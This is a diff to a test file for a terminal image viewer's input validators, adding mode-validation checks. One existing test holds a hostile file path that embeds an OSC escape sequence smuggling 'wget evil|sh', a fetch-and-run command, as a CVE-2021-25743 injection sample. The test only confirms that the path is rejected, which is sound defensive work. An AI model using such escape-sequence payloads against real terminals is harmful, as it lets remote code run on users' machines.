@@ -34,6 +34,15 @@ fn main() {
     assert_eq(kii_validate_color(256), 0, "--color 256 rejected (tier-2, post-v1)");
     assert_eq(kii_validate_color(0 - 1), 0, "--color -1 rejected");
 
+    # ---- 1.3.0: kii_validate_mode + kii_mode_is_ascii ----------------
+    test_group("1.3.0 — kii_validate_mode / kii_mode_is_ascii");
+    assert_eq(kii_validate_mode("halfblock"), 1, "halfblock valid");
+    assert_eq(kii_validate_mode("ascii"),     1, "ascii valid");
+    assert_eq(kii_validate_mode("bogus"),     0, "bogus rejected");
+    assert_eq(kii_validate_mode(""),          0, "empty rejected");
+    assert_eq(kii_mode_is_ascii("ascii"),     1, "ascii -> is_ascii");
+    assert_eq(kii_mode_is_ascii("halfblock"), 0, "halfblock -> not ascii");
+
     # ---- M1(a)(b)(c): flag-parse happy paths ------------------------
     # Each case builds a synthetic argv, registers kii's flag set into a
     # cmdit context, parses (the pure cmdit_parse_argv core — no /proc),
@@ -189,7 +198,7 @@ fn main() {
     # window-title-set + DECRQSS query that would hijack the
     # terminal if echoed raw.
     assert_eq(kii_path_has_control_bytes("/tmp/\x1b]2;wget evil|sh\x07.png"), 1,
-              "CVE-2021-25743 OSC-injection attack path → unsafe");
+    "CVE-2021-25743 OSC-injection attack path → unsafe");
     # BEL (0x07) is the OSC string terminator — another injection
     # primitive.
     assert_eq(kii_path_has_control_bytes("foo\x07.png"),        1, "BEL → unsafe");
